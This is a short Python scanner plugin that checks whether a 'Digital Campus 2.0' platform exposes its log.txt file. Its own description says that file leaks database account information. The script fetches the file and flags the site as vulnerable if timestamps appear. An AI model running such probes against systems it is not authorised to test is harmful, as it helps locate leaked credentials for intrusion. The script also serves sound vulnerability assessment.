# *_* coding=utf-8 *_*
# Author:Szrzvdny
import requests
import re
class digital_campus_log_disclosure(object):

    def __init__(self,url):
        self.result = {
            'url':url,
            'cms':'digital',
            'vuln_title':'digital_campus_log_disclosure',
            'vuln_level':1,
            'vuln_type':10,
            'vuln_author':'Szrzvdny',
            'vuln_source':'null',
            'description':':数字校园平台--Digital Campus2.0 Platform。log.txt日志文件泄露，可获取数据库账号等敏感信息',
        }
    def verify(self):
        headers = {
            'User-anget':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        }
        payload = "/log.txt"
        pattern = re.compile(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}')
        vulnurl = self.result['url'] + payload
        try:
            req = requests.get(vulnurl, headers=headers,verify=False)
            result = pattern.findall(req.text)
            if len(result) != 0:
                self.result['payload'] = self.result['url'] + payload
                return self.result
            else:
                pass
        except:
            pass

    def __exploit(self):
        pass

if __name__ == '__main__':
    verify = digital_campus_log_disclosure("http://127.0.0.1/")
    res = verify.verify()
    print(res)
    print(__file__)